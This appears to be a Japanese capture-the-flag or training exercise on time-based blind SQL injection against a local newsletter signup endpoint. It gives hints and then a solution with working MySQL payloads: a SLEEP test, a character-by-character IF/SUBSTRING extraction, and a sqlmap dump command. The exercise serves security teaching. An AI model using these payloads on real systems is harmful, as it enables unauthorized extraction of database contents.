# 05 - Time-based Blind Injection

`http://localhost:3005` のメルマガ登録(`POST /api/subscribe`, body: `email`)は、
成功しても失敗しても常に同じ`{"status":"ok"}`しか返さない。真偽の手がかりが一切ない状態で
DB内のflagを抜き出せ。

## ヒント

<details><summary>ヒント1</summary>

`server.py`を見ろ。`email`は文字列としてクォート内にそのまま連結されている。
レスポンスは常に同じなので、真偽判定はレスポンス本体からは得られない。

</details>

<details><summary>ヒント2</summary>

`SLEEP(秒数)`はMySQLがその秒数だけ処理を止める関数。injectionが刺さっているなら、
`SLEEP`を含むpayloadを送ると応答が意図的に遅くなるはずだ。

</details>

<details><summary>ヒント3</summary>

`SLEEP`を`IF(条件, SLEEP(秒), 0)`で包めば、条件が真の時だけ遅延させられる。
これを1文字ずつの比較条件にして、応答時間の有無でtrue/falseを判定すれば
boolean-blindと同じ要領でflagを1文字ずつ復元できる。

</details>

<details><summary>解答</summary>

まずinjection成立を確認:
```
email=x' OR SLEEP(3)-- 
```
約3秒応答が遅れればinjection成立。

1文字ずつの抽出:
```
email=x' OR IF((SELECT SUBSTRING(flag,1,1) FROM flags)='F', SLEEP(3), 0)-- 
```
応答が遅れれば真、即座に返れば偽。`SUBSTRING(flag, N, 1)`のNを増やしながら
全文字について繰り返せばflag全体を復元できる。

sqlmapを使う場合:
```
sqlmap -u "http://localhost:3005/api/subscribe" --data="email=x" \
  -p email --technique=T --dump
```

</details>
